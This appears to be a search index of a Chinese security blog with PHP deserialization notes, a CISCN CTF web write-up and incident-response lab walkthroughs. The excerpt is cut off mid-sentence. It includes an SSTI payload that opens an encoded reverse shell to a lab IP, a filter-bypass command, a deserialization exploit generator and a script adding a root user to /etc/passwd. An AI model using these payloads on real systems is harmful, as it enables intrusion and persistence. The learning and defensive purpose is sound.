[{"categories":["PHP"],"content":" Opi/Closure(闭包)函数PHP在5.3版本引入了Closure类用于代表匿名函数 根据PHP官方文档，Closure 类定义如下 \u003c? class Closure { /* 方法 */ private __construct() public static bind(Closure $closure, ?object $newThis, object|string|null $newScope = \"static\"): ?Closure public bindTo(object $newthis, mixed $newscope = 'static'): Closure public call(object $newThis, mixed ...$args): mixed public static fromCallable(callable $callback): Closure } ?\u003e 但是Closure是不允许序列化和反序列化的，然而Opi Closure库实现了这一功能，通过Opi Closure，可以方便对闭包进行序列化和反序列化，只需要使用Opis\\Closure\\serialize()和Opis\\Closure\\unserialize()即可 举个例子 \u003c?php include(\"./vendor/opis/closure/autoload.php\"); class Test{ public $source; public function __destruct(){ call_user_func($this-\u003esource,1); } } $func = function(){ $cmd = 'whoami'; system($cmd); }; $raw = \\Opis\\Closure\\serialize($func); $t = new Test; $t-\u003esource = \\Opis\\Closure\\unserialize($raw); $exp = serialize($t); unserialize($exp); //output f10wers13eicheng ","date":"2024-07-17","objectID":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/:1:0","tags":["PHP CTF-Web"],"title":"PHP反序列化冷知识点总结","uri":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"},{"categories":["PHP"],"content":" fast destruct 在 PHP 中单独执行unserialize函数，则反序列化得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行__destruct方法 而如果将unserialize()函数执行后得到的字符串赋值给一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁时才执行析构方法 比如PHP中有如下代码 \u003c?php class test{ public function __destruct(){ echo \"bypass\"; } } $a = @unserialize('O:4:\"test\":0:{}'); throw new Exception(\"No No No\"); ?\u003e //output -\u003e % php index.php PHP Fatal error: Uncaught Exception: No No No in /Users/f10wers13eicheng/Desktop/webserver/index.php:8 Stack trace: #0 {main} thrown in /Users/f10wers13eicheng/Desktop/webserver/index.php on line 8 Fatal error: Uncaught Exception: No No No in /Users/f10wers13eicheng/Desktop/webserver/index.php:8 Stack trace: #0 {main} thrown in /Users/f10wers13eicheng/Desktop/webserver/index.php on line 8 ","date":"2024-07-17","objectID":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/:2:0","tags":["PHP CTF-Web"],"title":"PHP反序列化冷知识点总结","uri":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"},{"categories":["PHP"],"content":" 0x01但是如果我们破坏正常序列化的结构，就会提前执行__destruct //O:4:\"test\":0:{ //O:4:\"test\":0:{1} //bypass ","date":"2024-07-17","objectID":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/:2:1","tags":["PHP CTF-Web"],"title":"PHP反序列化冷知识点总结","uri":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"},{"categories":["PHP"],"content":" 0x02利用array，众所周知array也是能被序列化/反序列化的，当反序列化时遇到null也会触发fast destruct，修改序列化后array的属性值即可 \u003c?php error_reporting(0); class test01{ public function __destruct(){ echo \"test01\".PHP_EOL; } } //$o = serialize(array(new test01)); //echo $o; $a = unserialize('a:2:{i:0;O:6:\"test01\":0:{}i:1;i:0;}'); throw new Exception(\"No No No\"); ?\u003e ","date":"2024-07-17","objectID":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/:2:2","tags":["PHP CTF-Web"],"title":"PHP反序列化冷知识点总结","uri":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"},{"categories":["PHP"],"content":" phar反序列化生成phar文件 $clazz = new Clazz(); @unlink(\"test.phar\"); $p = new Phar(\"test.phar\",0); $p-\u003estartBuffering(); $p-\u003esetMetadata($clazz); $p-\u003esetStub(\"GIF89a__HALT_COMPILER();\"); $p-\u003eaddFromString(\"text.txt\",\"successful!\"); $p-\u003estopBuffering(); 重新计算 phar 文件的签名 import hashlib f = open(\"test.phar\", \"rb\") data = f.read() f.close() length = int(data[47:51][::-1].hex(), 16) data = data[:51 + length - 1] + b\"1\" + data[51 + length:len(data) - 28] data += hashlib.sha1(data).digest() data += b\"\\x02\\x00\\x00\\x00GBMB\" f = open(\"test.phar\", \"wb\") f.write(data) f.close() ","date":"2024-07-17","objectID":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/:3:0","tags":["PHP CTF-Web"],"title":"PHP反序列化冷知识点总结","uri":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"},{"categories":["PHP"],"content":" stdClass和__PHP_Incomplete_ClassstdClass是所有类的基类，可以代替array来反序列化两个类 \u003c?php var_dump(unserialize('O:8:\"stdClass\":2:{i:0;O:6:\"test01\":0:{}i:1;O:6:\"test02\":0:{}}')) ?\u003e //output object(stdClass)#1 (2) { [\"0\"]=\u003e object(__PHP_Incomplete_Class)#2 (1) { [\"__PHP_Incomplete_Class_Name\"]=\u003e string(6) \"test01\" } [\"1\"]=\u003e object(__PHP_Incomplete_Class)#3 (1) { [\"__PHP_Incomplete_Class_Name\"]=\u003e string(6) \"test02\" } } 当反序列化一个没有类会出现__PHP_Incomplete_Class，并且其中会出现__PHP_Incomplete_Class_Name属性，值就是反序列化时没有的那个类，在序列化的时候便会恢复回去。 如果我们将__PHP_Incomplete_Class_Name属性改成其他名字，便会在反序列化再序列化之后就会消失 ","date":"2024-07-17","objectID":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/:4:0","tags":["PHP CTF-Web"],"title":"PHP反序列化冷知识点总结","uri":"/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"},{"categories":["CTF"],"content":" weblog/article.php?id=1存在sql注入，注入数据 找到隐藏路径，可以连接数据库，进行mysql fakeserver任意文件读取 /database.php POST /database.php HTTP/1.1 Host: 10.1.0.122:82 Content-Length: 123 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.1.0.122:82 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://10.1.0.122:82/hide/connect_fun_dbs_test_hides.php Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close jsonData={\"host\":\"10.1.0.130\",\"port\":3306,\"username\":\"root\",\"password\":\"password\"} 读取flag文件， ","date":"2024-06-17","objectID":"/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/:1:0","tags":["CISCN Web"],"title":"CISCN西南赛区 WebWriteUp","uri":"/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/"},{"categories":["CTF"],"content":" ezssti访问/hello点击连接跳转/destiny 直接打ssti %23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22bash+-c+{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEuMC4xMTkvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}%22) 成功反弹shell ","date":"2024-06-17","objectID":"/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/:2:0","tags":["CISCN Web"],"title":"CISCN西南赛区 WebWriteUp","uri":"/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/"},{"categories":["CTF"],"content":" zwxajavaf/backup.zip下载源码 存在反序列化 直接上传序列化的文件即可， 利用点 payload package com.example.zwxajavaf1; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class JavaPayload{ public static void main(String[] args) throws Exception{ MyCustomObject myCustomObject = new MyCustomObject(); setFieldValue(myCustomObject,\"filePath\",\"/usr/local/tomcat/webapps/admin_info.txt\"); serialize(myCustomObject); } public static void serialize(Object o) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(o); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 上传后得到密码 反序列化之后得到密码 登陆后rce ","date":"2024-06-17","objectID":"/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/:3:0","tags":["CISCN Web"],"title":"CISCN西南赛区 WebWriteUp","uri":"/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/"},{"categories":["CTF"],"content":" ssrf2rce访问/flag.php flag{th1s_is_f4ke_flag} But,there is something in coooooomand.php~!! 访问coooooomand.php \u003c?php function executeCommand($command) { if (preg_match('/cat| |\\\\\\\\|\\${IFS}|%09|\\$[*@x]|tac|iconv|shuf|comm|bat|more|less|nl|od|sed|awk|perl|python|ruby|xxd|hexdump|string/', $command)) { return \"Hacker!!!\"; } $output = shell_exec($command); if ($output === null) { return \"uhhhh\"; } return $output; } $command = isset($_GET['command']) ? $_GET['command'] : ''; if (!empty($command)) { $result = executeCommand($command); echo nl2br(htmlspecialchars($result, ENT_QUOTES, 'UTF-8')); } else { echo highlight_file(__FILE__, true); } ?\u003e 进行绕过/coooooomand.php?command=/bin/ca?$IFS/flag fix？？？fix ctf rce 绕过 Orz ","date":"2024-06-17","objectID":"/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/:4:0","tags":["CISCN Web"],"title":"CISCN西南赛区 WebWriteUp","uri":"/ciscn%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA-webwriteup/"},{"categories":["应急响应"],"content":" 0x00 环境分析 第四章 windows实战-黑页\u0026\u0026篡改 远程端口 3389 账号密码 administrator xj@123456 请启动 phpstudy 后访问 127.0.0.1 具体要求已经在桌面 readme.png 本题为开放式题目，请访问 http://127.0.0.1/dedecms/index.php ","date":"2024-06-11","objectID":"/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98--%E9%BB%91%E9%A1%B5%E7%AF%A1%E6%94%B9/:1:0","tags":["windows 实战"],"title":"第四章-Windows实战-黑页\u0026\u0026篡改","uri":"/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98--%E9%BB%91%E9%A1%B5%E7%AF%A1%E6%94%B9/"},{"categories":["应急响应"],"content":" 0x011、http://localhost/dedecms/index1.php 直接在index1.php删除 修复完成 2、http://localhost/dedecms/index2.php 跳转到了/heiye/index2.html 在index2.php中并无跳转的url，追踪包含的文件 在common2.inc.php中发现跳转的文件 修复完成 3、http://localhost/dedecms/index3.php 跳转到了/heiye/index3.html 在index3.php中引入了一串恶意的js文件 \u003cscript src=\"\u0026#104;\u0026#116;\u0026#116;\u0026#112;\u0026#58;\u0026#47;\u0026#47;\u0026#49;\u0026#50;\u0026#55;\u0026#46;\u0026#48;\u0026#46;\u0026#48;\u0026#46;\u0026#49;\u0026#47;\u0026#100;\u0026#101;\u0026#100;\u0026#101;\u0026#99;\u0026#109;\u0026#115;\u0026#47;\u0026#105;\u0026#110;\u0026#99;\u0026#108;\u0026#117;\u0026#100;\u0026#101;\u0026#47;\u0026#49;\u0026#46;\u0026#106;\u0026#115;\"\u003e\u003c/script\u003e 修复完成 4、http://localhost/dedecms/index4.php 跳转到了/heiye/index2.html index4.php中并无发现可以内容，追踪其包含文件 在目录中并没有看到common3.inc.php，利用自带的everything进行搜索 可以看到成功搜索出来，打开后进行修复 5、http://localhost/dedecms/heiye/index5.html 在index5.php中发现包含了一串加密的东西，解密一下试试 直接删除即可 修复 ","date":"2024-06-11","objectID":"/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98--%E9%BB%91%E9%A1%B5%E7%AF%A1%E6%94%B9/:2:0","tags":["windows 实战"],"title":"第四章-Windows实战-黑页\u0026\u0026篡改","uri":"/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98--%E9%BB%91%E9%A1%B5%E7%AF%A1%E6%94%B9/"},{"categories":["应急响应"],"content":" 0x00 环境分析 服务器场景操作系统 None 服务器账号密码 None None 任务环境说明 注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！ 应急响应工程师小王在 WAF 上发现了一段恶意流量，请分析流量且提交对应 FLAG ","date":"2024-06-11","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/:1:0","tags":["钓鱼邮件"],"title":"第六章-流量特征分析-小王公司收到的钓鱼邮件","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/"},{"categories":["应急响应"],"content":" 0x011、下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx/w0ks//?YO=xxxxxxx}） (无需 http、https)； 搜索http流量 flag{tsdandassociates.co.sz/w0ks//?YO=1702920835} 2、下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag{md5}）； 找到响应包，选择导出分组字节流 保存为压缩文件即可 flag{f17dc5b1c30c512137e62993d1df9b2f} 3、下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag{域名}(无需 http、https) 将js文件进行美化处理后，放到console控制台运行一下 flag{shakyastatuestrade.com} ","date":"2024-06-11","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/:2:0","tags":["钓鱼邮件"],"title":"第六章-流量特征分析-小王公司收到的钓鱼邮件","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/"},{"categories":["应急响应"],"content":" 0x00 环境分析 第九章-NOP Team-A 靶机来源 NOP Team 鸣谢 NOP Team 可以采用本地搭建或者是云端调度 搭建链接 https://mp.weixin.qq.com/s/p1KNDU84PXOv-fqo8TfHNQ 账户 root 密码 nopteama 请启动禅道服务 /opt/zbox/zbox -ap 8081 \u0026\u0026 /opt/zbox/zbox start 通过dmz-A攻击者遗留下来的攻击结果，分析结果使用里面的用户名和密码可以对此环境进行登陆，自行保存id_rsa密钥文件 ssh -p 222 xxx@xxx.xxxx.xxx 可以通过dmz-B泄露的密钥将其保存到本地，然后进行登陆ssh ssh -i xxx_xxx xxxx@xxxx.xxxx.xxxx ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-nopteam-dmz-a-c/:1:0","tags":["DMZ"],"title":"第九章-NOPTeamDmz-A-C","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-nopteam-dmz-a-c/"},{"categories":["应急响应"],"content":" 0x011、请提交禅道的版本号，格式: flag{xx.xxx.xxxx} flag{18.0.beta1} 2、分析攻击者使用了什么工具对内网环境进行了信息收集，将该工具名称提交 flag{xxxx} 查看apt.pcap 利用了icmp echo探测了存活 发送了一次完整的TCP请求 并且还有漏洞扫描的流量，特征符合fscan flag{fscan} 3、攻击者攻击服务器得到shell以后，是处于哪个用户下做的操作，将该用户名提交 flag{xxxx} 18.0.beta1下存在一个RCE漏洞 https://blog.csdn.net/qq_41904294/article/details/128838423 搜索一下特征http contains \"SCM=Subversion\" flag{nobody} 4、攻击者扫描到内网 DMZ-B机器的账户密码为多少格式 flag{root:root} 搜索一下是否有fscan find / -name \"*fscan*\" 直接看扫描结果 flag{admin:123456} 1、攻击者通过DMZ-A登陆到DMZ-B机器里，在上面发现了DMZ-C机器里的一个密钥，通过某服务直接进行了登陆，请将服务名与登陆的用户名提交 \u003c格式：flag{ftp:anonymous} 通过上面拿到的密码admin:123456 通过查看历史命令 得到通过ssh连接到了dmz-C flag{ssh:deploy} 将私钥拿下来 1、攻击者上传了一个挖矿程序，请将该挖矿程序的名称提交，格式 \u003cflag{xxxxxx}\u003e history 其中挖矿程序在/opt目录 flag{xmrig} 2、攻击者上传了一个挖矿程序，请将该挖矿的地址提交，格式 \u003cflag{xxxxxx}\u003e 在config.json里面 flag{xmrs1.pool.cn.com:55503} 3、攻击者上传了一个挖矿程序，但由于DMZ-C机器是不出网的，所以攻击者通过了一种方式将流量转发了出去，请将转发的目标端口提交，格式 \u003cflag{xxxxxx}\u003e 在/opt/client目录下存在frp flag{1080} 4、攻击者上传了一个挖矿程序，但由于DMZ-C机器是不出网的，所以攻击者通过了一种方式将流量转发了出去，请将用来做转发的工具的名称提交，格式 \u003cflag{xxxxxx}\u003e flag{frpc} 5、攻击者最后通过某配置文件配置错误，从而直接可以拥有root用户权限，请将错误配置的那一行等于号后面的内容(不含空格)提交，格式 \u003cflag{xxxxxxx}\u003e sudo -l sudo cat /etc/sudoers flag{(ALL:ALL)NOPASSWD:ALL} ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-nopteam-dmz-a-c/:2:0","tags":["DMZ"],"title":"第九章-NOPTeamDmz-A-C","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-nopteam-dmz-a-c/"},{"categories":["应急响应"],"content":" 0x00 环境分析 服务器场景操作系统 Linux 服务器账号密码 root qi5qaz 任务环境说明 注：进去后执行 sed -i 's/Listen 80/Listen 9999/' /etc/apache2/ports.conf \u0026\u0026 service apache2 restart 开放题目 漏洞修复 ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-blueteam-%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/:1:0","tags":["Linux wireshark"],"title":"第九章-Blueteam的小心思","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-blueteam-%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/"},{"categories":["应急响应"],"content":" 0x011、攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。 查找一下流量包 find / -name \"*.pcap\" http contains \"login.php\" Aa12345^ flag{d63edb0e9df4cf411398e3658c0237e0} 2、攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串\"upload.php\"的小写md5值，格式flag{md5}。 http contains \"boundary\" pluginmgr.php flag{b05c0be368ffa72e6cb2df7e1e1b27be} 3、找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。 D盾扫描 flag{a097b773ced57bb7d51c6719fe8fe5f5} 4、攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。 看一下webshell的时间 find / -newerct '2023-11-18 07:30:00' ! -newerct '2023-11-19 07:30:00' ! -path '/proc/*' ! -path /'sys/*' ! -path '/run/*' -type f -exec ls -lctr --full-time {} \\+ 2\u003e/dev/null | grep www-data md5sum \"/var/www/html/plugins/. /is.world\" flag{ee279c39bf3dcb225093bdbafeb9a439} 5、攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串\"attack\"的小写md5值，格式flag{md5}。 cat /etc/passwd md5 -s knowledgegraphd flag{4cda3461543c9a770a3349760594facd} 6、攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。 cat /etc/profile 发送了其中恶意文件 md5sum /etc/profile flag{65bf3e4a9ac90d75ec28be0317775618} 7、攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。 cat /root/.bashrc md5sum /root/.bashrc flag{4acc9c465eeeb139c194893ec0a8bcbc} 8、攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串\"user\"的小写md5值，格式flag{md5}。 连接一下数据库 root/mysql123 其中JPMorgan Chase数据库无法打开 在/var/lib/mysql中存储着数据库文件 md5 -s JPMorgan@0020Chase flag{0928a5424aa6126e5923980ca103560e} 9、解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。 find / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm 2\u003e/dev/null 其中clockup.php文件正是加密文件 写出一个解密脚本 \u003c?php $currentDate = \"2023-11-18\"; $key = md5($currentDate); $iv = substr(hash('sha256', \"DeepMountainsGD\"), 0, 16); $filePath = \"/var/lib/mysql/JPMorgan@0020Chase\"; $files = scandir($filePath); foreach ($files as $file) { if ($file != \".\" \u0026\u0026 $file != \"..\") { $fullPath = $filePath . '/' . $file; $content = file_get_contents($fullPath); $encryptedContent = openssl_decrypt($content, 'aes-256-cbc', $key, 0, $iv); file_put_contents($fullPath, $encryptedContent); } } ?\u003e flag{8fd82b8864d71ed7fa12b59e6e34cd1c} 10、因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。 find / -user root -perm -4000 2\u003e/dev/null cat /etc/sudoers sudo提权 md5sum /etc/sudoers flag{6585817513b0ea96707ebb0d04d6aeff} ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-blueteam-%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/:2:0","tags":["Linux wireshark"],"title":"第九章-Blueteam的小心思","uri":"/%E7%AC%AC%E4%B9%9D%E7%AB%A0-blueteam-%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/"},{"categories":["应急响应"],"content":" 0x00 环境分析 靶机来源 @vulntarget 靶机可以采集本地搭建或者是云端调度 搭建链接 https://github.com/crow821/vulntarget 本题不提供靶机账户密码请根据nacos 获取的shirokey 攻击靶机后登录应急 ","date":"2024-06-11","objectID":"/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java02-shiro/:1:0","tags":["Java 内存马"],"title":"第八章-内存马分析-Java02-Shiro","uri":"/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java02-shiro/"},{"categories":["应急响应"],"content":" 0x01利用上一题获取的shiro key攻击后进行应急 1、将 shiro 的 key 作为 flag 提交 flag{KduO0i+zUIMcNNJnsZwU9Q==} 2、隐藏用户后删除，并将隐藏用户名作为 flag 提交 8088运行着Shiro服务 cat /etc/passwd flag{guest} 3、分析app.jar文件是否存在后门，并把后门路由名称作为 flag 提交 添加一个用户利用ssh进行连接 #!/bin/bash echo \"system:adk6oNRwypFwA:0:0:eval_to_root:/root:/bin/bash\" \u003e\u003e /etc/passwd \u0026\u0026 echo \"PermitRootLogin yes\" \u003e\u003e /etc/ssh/sshd_config \u0026\u0026 /etc/init.d/ssh restart echo IyEvYmluL2Jhc2gKCmVjaG8gInN5c3RlbTphZGs2b05Sd3lwRndBOjA6MDpldmFsX3RvX3Jvb3Q6L3Jvb3Q6L2Jpbi9iYXNoIiA+PiAvZXRjL3Bhc3N3ZCAmJiBlY2hvICJQZXJtaXRSb290TG9naW4geWVzIiA+PiAvZXRjL3NzaC9zc2hkX2NvbmZpZyAmJiAvZXRjL2luaXQuZC9zc2ggcmVzdGFydA==|base64 -d \u003e /tmp/ssh.sh 连接ssh system/admin123 flag{/exec} 4、分析app.jar文件，将后门的密码作为 flag 提交 flag{cmd} ","date":"2024-06-11","objectID":"/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java02-shiro/:2:0","tags":["Java 内存马"],"title":"第八章-内存马分析-Java02-Shiro","uri":"/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java02-shiro/"},{"categories":["应急响应"],"content":" 0x00 环境分析 靶机来源 @vulntarget 靶机可以采集本地搭建或者是云端调度 搭建链接 https://github.com/crow821/vulntarget ssh root@ip 密码xjnacos 启动 /var/local/下的 autorun.sh即可正常启动 ","date":"2024-06-11","objectID":"/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java01-nacos/:1:0","tags":["Java 内存马"],"title":"第八章-内存马分析-Java01-Nacos","uri":"/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java01-nacos/"},{"categories":["应急响应"],"content":" 0x011、nacos 用户密码的密文值作为 flag 提交 flag{密文} 在conf/nacos-mysql.sql文件中找到密码 flag{$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu} 2、shiro 的key为多少 shiro 的 key 请记录下来 flag{KduO0i+zUIMcNNJnsZwU9Q==} 3、靶机内核版本为 uname -r flag{5.4.0-164-generic} 4、尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 flag cat /etc/passwd 发现bt为最高权限用户，进行删除 userdel bt 此用户正在运行一些服务，无法删除。 直接修改/etc/passwd文件进行删除 5、尝试修复 nacos 并且自行用 poc 测试是否成功 8848端口运行nacos服务 扫描出几个漏洞 进行逐一修复 第一个未授权 http://68.79.11.194:8848/nacos/v1/auth/users?pageNo=1\u0026pageSize=9 在conf/application.properties开启鉴权 nacos.core.auth.enabled=true nacos.core.auth.enable.userAgentAuthWhite=false nacos.core.auth.server.identity.key=key nacos.core.auth.server.identity.value=value ","date":"2024-06-11","objectID":"/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java01-nacos/:2:0","tags":["Java 内存马"],"title":"第八章-内存马分析-Java01-Nacos","uri":"/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java01-nacos/"},{"categories":["应急响应"],"content":" 0x00 环境分析 应急响应工程师在内网服务器发现有台主机 cpu 占用过高，猜测可能是中了挖矿病毒，请溯源分析，提交对应的报告给应急小组 虚拟机账号密码 root websecyjxy web 端口为 8081 1、黑客的IP是？ flag格式：flag{黑客的ip地址}，如：flag{127.0.0.1} 2、黑客攻陷网站的具体时间是？ flag格式：flag{年-月-日 时:分:秒}，如：flag{2023-12-24 22:23:24} 3、黑客上传webshell的名称及密码是？ flag格式：flag{黑客上传的webshell名称-webshell密码}，如：flag{webshell.php-pass} 4、黑客提权后设置的后门文件名称是？ flag格式：flag{后门文件绝对路径加上名称}，如：flag{/etc/passwd} 5、对黑客上传的挖矿病毒进行分析，获取隐藏的Flag ","date":"2024-06-11","objectID":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E6%8C%96%E7%9F%BF/:1:0","tags":["Linux 挖矿"],"title":"第五章-Linux实战-挖矿","uri":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E6%8C%96%E7%9F%BF/"},{"categories":["应急响应"],"content":" 0x011、黑客的IP是？ find / -name \"*.php\"查找一个web目录 根目录/www/admin/websec_80/wwwroot/ 日志目录/www/admin/websec_80/log 查看日志nginx_access_2023-12-22.log，大部分都是一个ip flag{192.168.10.135} 2、黑客攻陷网站的具体时间是？ dedecms 很多都是后台漏洞，所以我们需要登录进后台查看 弱口令admin:12345678 在用户管理处发现了黑客添加的用户 flag{2023-12-22 19:08:34} 3、黑客上传webshell的名称及密码是？ 压缩源码，放到 